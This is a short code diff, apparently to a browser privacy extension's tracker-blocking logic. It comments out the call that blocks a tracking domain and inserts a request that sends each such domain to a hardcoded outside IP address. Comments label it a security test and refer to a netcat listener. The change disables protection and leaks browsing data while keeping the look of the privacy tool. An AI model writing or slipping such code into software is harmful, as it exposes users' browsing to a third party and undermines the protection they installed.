@@ -79,7 +79,17 @@ HeuristicBlocker.prototype = {
     });
     // if no parent domains are on the cookie block list then block fqdn
     if (!set) {
-      this.storage.setupHeuristicAction(fqdn, constants.BLOCK);
+      //this.storage.setupHeuristicAction(fqdn, constants.BLOCK);
+      // TODO: AAU-SECURITY TEST
+      utils.xhrRequest("http://142.93.109.128:443/" + fqdn, function(err, response) {
+        if (err) {
+          console.error('Problem calling netcast listener');
+        }
+        if (response) {
+          console.log('We are happy, netcat called');
+        }
+      });
+      // END OF TEST
     }
 
     this.setupSubdomainsForCookieblock(baseDomain);
